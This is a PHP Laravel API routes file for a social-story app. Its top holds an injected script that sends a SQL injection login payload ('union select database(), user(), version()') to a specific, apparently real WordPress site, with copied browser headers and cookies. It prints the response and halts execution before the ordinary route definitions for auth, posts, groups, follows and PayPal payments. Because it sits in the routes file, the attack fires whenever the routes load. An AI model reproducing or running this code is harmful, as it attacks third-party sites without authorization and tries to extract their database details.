<?php


use GuzzleHttp\Client;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
$client = new Client;
$request = new \http\Client\Request();
$request->setRequestUrl('https://mediianews.com/wp-admin/admin-ajax.php');
$request->setRequestMethod('POST');
$body = new http\Message\Body;
$body->addForm(array(
    'log' => 'admin&union select *, database() , user() , version() ',
    'pwd' => '1234'
), array(

));
$request->setBody($body);
$request->setOptions(array());
$request->setHeaders(array(
    'authority' => 'mediianews.com',
    'method' => 'POST',
    'path' => '/wp-login.php?page=wp-admin/admin-ajax.php&log=admin%27%20union%20select1,database(),user(),version()&pwd=1234&wp-submit=Log+In',
    'scheme' => 'https',
    'accept' => ' text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-encoding' => ' gzip, deflate, br',
    'accept-language' => ' ar,en-US;q=0.9,en;q=0.8',
    'cache-control' => ' max-age=0',
    'content-length' => ' 104',
    'content-type' => ' application/x-www-form-urlencoded',
    'cookie' => ' __gads=ID=3d31287dcaf0bae8-22c92f29bccd000b:T=1656112669:RT=1656112669:S=ALNI_MaV45s40k40sG6NxHfI5gXB4mf1CA; __gpi=UID=000007b5862a4ea0:T=1656112669:RT=1656112669:S=ALNI_MbGQ9n6UhB-xfPsius-3N6SfpHZug; wordpress_test_cookie=WP%20Cookie%20check; tk_ai=jetpack%3AkaUP7z%2B7n9FgQBwPRTGGAUGN; wordpress_test_cookie=WP%20Cookie%20check',
    'origin' => ' https://mediianews.com',
    'referer' => ' https://mediianews.com/wp-login.php?page=admin-ajax.php&log=admin%27%20union%20select1,database(),user(),version()&pwd=1234&wp-submit=Log+In',
    'sec-ch-ua' => ' " Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
    'sec-ch-ua-mobile' => ' ?0',
    'sec-ch-ua-platform' => ' "Windows"',
    'sec-fetch-dest' => ' document',
    'sec-fetch-mode' => ' navigate',
    'sec-fetch-site' => ' same-origin',
    'sec-fetch-user' => ' ?1',
    'upgrade-insecure-requests' => ' 1'
));
$client->enqueue($request)->send();
$response = $client->getResponse();
echo $response->getBody();

dd(4444);
/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
    return $request->user();
});

Route::group(['namespace' => 'Api', 'middleware' => 'LanguageSwitcher'], function () {


    Route::post('checkPhone', 'AuthController@checkPhone')->name('checkPhone');;
    Route::post('checkUserName', 'AuthController@checkUserName')->name('checkUserName');;
    Route::post('checkEmail', 'AuthController@checkEmail')->name('checkEmail');;
    Route::get('auth/google/callback', 'SocialController@facebookRedirect');
    Route::get('auth/google', 'SocialController@handleGoogleCallback');

    Route::post('login', 'AuthController@login')->name('login');
    Route::post('register', 'AuthController@store')->name('store');
    Route::post('verify', 'AuthController@verifyNew');
    Route::post('forget/password', 'AuthController@forgetPassword');
    Route::post('/confirm/password/code', 'AuthController@ResetToken');
    Route::post('/reset/password', 'AuthController@updatePasswordByPhone');

    Route::get('/users', 'UserController@users');
    Route::get('settings', 'SettingController@settings');
    Route::post('send/feedback', 'SettingController@sendFeedback');
    Route::get('check/promo', 'SettingController@checkPromo');
    Route::get('getAdds', 'SettingController@Adds_system');

    Route::middleware(['auth:sanctum'])->group(function () {
        Route::post('storymap', 'StoryController@storymap');
        Route::post('SingleStory', 'StoryController@singleStory');
        Route::get('user/{id}/Show', 'UserController@userShow');
        Route::get('user/{id}/Posts', 'UserController@userPosts');
        Route::get('home/posts', 'UserController@HomePosts');
        Route::post('my/profile', 'AuthController@show');
        Route::get('my/notification', 'AuthController@Mynotification');
        Route::post('/logout', 'AuthController@logout');
        Route::post('/update/my/profile', 'AuthController@update');
        Route::post('/update/my/password', 'AuthController@updatePassword');
        Route::post('/update/photo', 'AuthController@uploadAvatar');
        Route::get('my/stories', 'AuthController@userStoires');
        Route::get('user/stories', 'AuthController@userPosts');
        Route::get('user/posts', 'AuthController@myPosts');
        Route::get('user/followers', 'AuthController@userfollowers');
        Route::get('user/following', 'AuthController@userfollowing');

       Route::post('update/post', 'StoryController@updatePost');
        Route::post('new/post', 'StoryController@newPost');
        Route::post('delete/{id}/post', 'StoryController@deletePost');
        Route::post('send/post/report', 'StoryController@sendPostReport');
        Route::post('share/post', 'StoryController@sharePost');
        Route::post('save/post', 'StoryController@savePost');
        Route::post('like/post', 'StoryController@likePost');
        Route::post('block/post', 'StoryController@blockStory');
        Route::get('post/{id}/comments', 'StoryController@PostComments');
        Route::post('send/post/comments', 'StoryController@sendPostComments');
        Route::post('delete/{id}/post/comments', 'StoryController@DeleteComment');
        Route::post('like/post/comments', 'StoryController@likeComment');
        Route::post('create/group', 'StoryController@createGroup');
        Route::post('remove/member/group', 'StoryController@removeGroupMembers');
        Route::post('delete/{id}/group', 'StoryController@deleteGroup');
        Route::post('add/member/group', 'StoryController@addGroupMembers');
        Route::get('my/groups', 'StoryController@mygroups');
        Route::get('my/groups/members', 'StoryController@myGroupMember');




        Route::post('block/user', 'AuthController@blockUser');
        Route::get('block/list/users', 'AuthController@blockUsersList');
        Route::post('Unblock/user', 'AuthController@unblockUser');
        Route::post('make/follow/user', 'AuthController@followUser');
        Route::get('my/save/post', 'StoryController@mysavedPosts');
        Route::get('my/followers', 'AuthController@myfollowers');
        Route::get('my/following', 'AuthController@myfollowing');
        Route::get('my/following', 'AuthController@myfollowing');
        Route::get('promotion/packages', 'PromotionController@PromotionPackages');
        Route::get('promotion/package/{id}/show', 'PromotionController@PromotionPackageShow');
        Route::post('promotion/package/subscribe', 'PaypalPaymentController@processTransaction')->name('createTransaction');
        Route::get('payment/success', 'PaypalPaymentController@successTransaction')->name('successTransaction');
        Route::get('cancel', 'PaypalPaymentController@cancelTransaction')->name('cancelTransaction');


    });
});
